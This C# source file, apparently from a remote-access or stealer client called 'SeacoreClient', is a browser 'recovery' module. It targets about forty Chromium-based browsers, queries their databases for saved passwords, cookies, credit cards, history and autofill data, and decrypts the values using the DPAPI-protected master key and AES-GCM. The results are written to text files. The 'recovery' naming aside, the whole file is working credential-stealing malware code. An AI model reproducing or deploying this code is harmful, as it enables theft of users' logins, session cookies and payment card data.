using SeacoreClient.Features.Recovery.Utilities;
using Org.BouncyCastle.Crypto.Parameters;
using Org.BouncyCastle.Crypto.Engines;
using Org.BouncyCastle.Crypto.Modes;
using System.Security.Cryptography;
using System.Data.SQLite;
using Newtonsoft.Json;
using System.Text;

namespace SeacoreClient.Features.Recovery.Browsers.Chromium
{
    public static class ChromiumCommon
    {
        public static readonly Dictionary<string, string> BrowserDirectories = new()
        {
            {"Chromium", @"Chromium\User Data\Default"},
            {"GoogleChrome", @"Google\Chrome\User Data\Default"},
            {"GoogleChromeSxS", @"Google\Chrome SxS\User Data\Default"},
            {"GoogleChromeBeta", @"Google\Chrome Beta\User Data\Default"},
            {"GoogleChromeDev", @"Google\Chrome Dev\User Data\Default"},
            {"GoogleChromeUnstable", @"Google\Chrome Unstable\User Data\Default"},
            {"GoogleChromeCanary", @"Google\Chrome Canary\User Data\Default"},
            {"Edge", @"Microsoft\Edge\User Data\Default"},
            {"Brave", @"BraveSoftware\Brave-Browser\User Data\Default"},
            {"OperaGX", @"Opera Software\Opera GX Stable"},
            {"Opera", @"Opera Software\Opera Stable"},
            {"OperaNeon", @"Opera Software\Opera Neon\User Data\Default"},
            {"Vivaldi", @"Vivaldi\User Data\Default"},
            {"Blisk", @"Blisk\User Data\Default"},
            {"Epic", @"Epic Privacy Browser\User Data\Default"},
            {"SRWareIron", @"SRWare Iron\User Data\Default"},
            {"ComodoDragon", @"Comodo\Dragon\User Data\Default"},
            {"Yandex", @"Yandex\YandexBrowser\User Data\Default"},
            {"YandexCanary", @"Yandex\YandexBrowserCanary\User Data\Default"},
            {"YandexDeveloper", @"Yandex\YandexBrowserDeveloper\User Data\Default"},
            {"YandexBeta", @"Yandex\YandexBrowserBeta\User Data\Default"},
            {"YandexTech", @"Yandex\YandexBrowserTech\User Data\Default"},
            {"YandexSxS", @"Yandex\YandexBrowserSxS\User Data\Default"},
            {"Slimjet", @"Slimjet\User Data\Default"},
            {"UC", @"UCBrowser\User Data\Default"},
            {"Avast", @"AVAST Software\Browser\User Data\Default"},
            {"CentBrowser", @"CentBrowser\User Data\Default"},
            {"Kinza", @"Kinza\User Data\Default"},
            {"Chedot", @"Chedot\User Data\Default"},
            {"360Browser", @"360Browser\User Data\Default"},
            {"Falkon", @"Falkon\User Data\Default"},
            {"AVG", @"AVG\Browser\User Data\Default"},
            {"CocCoc", @"CocCoc\Browser\User Data\Default"},
            {"Torch", @"Torch\User Data\Default"},
            {"NaverWhale", @"Naver\Whale\User Data\Default"},
            {"Maxthon", @"Maxthon\User Data\Default"},
            {"Iridium", @"Iridium\User Data\Default"},
            {"Puffin", @"CloudMosa\Puffin\User Data\Default"},
            {"Kometa", @"Kometa\User Data\Default"},
            {"Amigo", @"Amigo\User Data\Default"}
        };

        public static readonly Dictionary<string, string> FileNames = new()
        {
            {"Bookmarks", "Bookmarks.txt"},
            {"Passwords", "Passwords.txt"},
            {"Cookies", "Cookies.txt"},
            {"History", "History.txt"},
            {"CreditCards", "CreditCards.txt"},
            {"Autofill", "Autofill.txt"}
        };

        public static readonly Dictionary<string, string> DbQueries = new()
        {
            {"History", "SELECT urls.url, urls.title, urls.visit_count, visits.visit_time FROM urls JOIN visits ON urls.id = visits.url ORDER BY visit_time DESC"},
            {"Passwords", "SELECT origin_url, username_value, password_value FROM logins"},
            {"Cookies", "SELECT host_key, name, encrypted_value, expires_utc FROM cookies"},
            {"CreditCards", "SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards"},
            {"Autofill", "SELECT name, value, date_created, date_last_used FROM autofill WHERE name IN ('email', 'phone', 'street_address', 'city', 'state', 'zipcode') ORDER BY date_last_used DESC"},
        };

        public static string DecryptChromium(byte[] passwordBlob, byte[] key)
        {
            if (passwordBlob == null || passwordBlob.Length <= 15 || key == null)
            {
                return string.Empty;
            }
            byte[] nonce = new byte[12];
            Array.Copy(passwordBlob, 3, nonce, 0, nonce.Length);
            byte[] ciphertext = new byte[passwordBlob.Length - 3 - nonce.Length];
            Array.Copy(passwordBlob, 3 + nonce.Length, ciphertext, 0, ciphertext.Length);

            GcmBlockCipher cipher = new(new AesEngine());
            AeadParameters parameters = new(new KeyParameter(key), 128, nonce, null);

            cipher.Init(false, parameters);
            byte[] plainText = new byte[cipher.GetOutputSize(ciphertext.Length)];
            int len = cipher.ProcessBytes(ciphertext, 0, ciphertext.Length, plainText, 0);
            cipher.DoFinal(plainText, len);

            return Encoding.UTF8.GetString(plainText).TrimEnd('\0');
        }

        public static byte[] DecryptWithYandex(byte[] key, byte[] ciphertext)
        {
            int nonceSize = 12;
            int minEncryptedDataSize = 3 + nonceSize;

            if (ciphertext.Length < minEncryptedDataSize)
            {
                throw new ArgumentException("Ciphertext length is invalid", nameof(ciphertext));
            }

            byte[] nonce = new byte[nonceSize];
            Array.Copy(ciphertext, 3, nonce, 0, nonceSize);

            int encryptedPasswordLength = ciphertext.Length - 3 - nonceSize;
            byte[] encryptedPassword = new byte[encryptedPasswordLength];
            Array.Copy(ciphertext, 3 + nonceSize, encryptedPassword, 0, encryptedPasswordLength);

            return AESGCMDecrypt(key, nonce, encryptedPassword);
        }

        private static byte[] AESGCMDecrypt(byte[] key, byte[] nonce, byte[] ciphertext)
        {
            GcmBlockCipher cipher = new(new AesEngine());
            AeadParameters parameters = new(new KeyParameter(key), 128, nonce);

            cipher.Init(false, parameters);
            byte[] plaintext = new byte[cipher.GetOutputSize(ciphertext.Length)];
            int len = cipher.ProcessBytes(ciphertext, 0, ciphertext.Length, plaintext, 0);
            cipher.DoFinal(plaintext, len);

            return plaintext;
        }

        public static byte[] GetKey(string browserName)
        {
            string folderPath = BrowserDirectories[browserName].Replace(@"\Default", "");

            Environment.SpecialFolder baseFolder = browserName.StartsWith("Opera") ?
                                                    Environment.SpecialFolder.ApplicationData :
                                                    Environment.SpecialFolder.LocalApplicationData;

            string localStatePath = Path.Combine(Environment.GetFolderPath(baseFolder), folderPath, "Local State");

            if (!File.Exists(localStatePath)) return null;

            var localState = JsonConvert.DeserializeObject<dynamic>(File.ReadAllText(localStatePath));
            string encryptedKeyBase64 = localState.os_crypt.encrypted_key;
            byte[] encryptedKey = Convert.FromBase64String(encryptedKeyBase64).Skip(5).ToArray(); // Skip the "DPAPI" prefix
            byte[] key = ProtectedData.Unprotect(encryptedKey, null, DataProtectionScope.CurrentUser);
            return key;
        }

        public static void ExecuteSqliteQueryAndProcessResults(string browserName, string dbName, string query, Func<SQLiteDataReader, string> resultProcessor, string resultFileName)
        {
            string searchPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData), BrowserDirectories[browserName], dbName);
            if (!File.Exists(searchPath)) return;

            string tempFilePath = Path.GetTempFileName();
            try
            {
                File.Copy(searchPath, tempFilePath, true);
                using var connection = new SQLiteConnection($"Data Source={tempFilePath};");
                connection.Open();
                using var command = new SQLiteCommand(query, connection);
                using var reader = command.ExecuteReader();
                if (reader.HasRows)
                {
                    string outputPath = UtilitiesCommon.PrepareRecoveryFilePath(browserName, resultFileName);
                    using var sw = new StreamWriter(outputPath, false);
                    while (reader.Read())
                    {
                        string resultLine = resultProcessor(reader);
                        sw.WriteLine(resultLine);
                    }
                }
            }
            finally
            {
                File.Delete(tempFilePath);
            }
        }
    }
}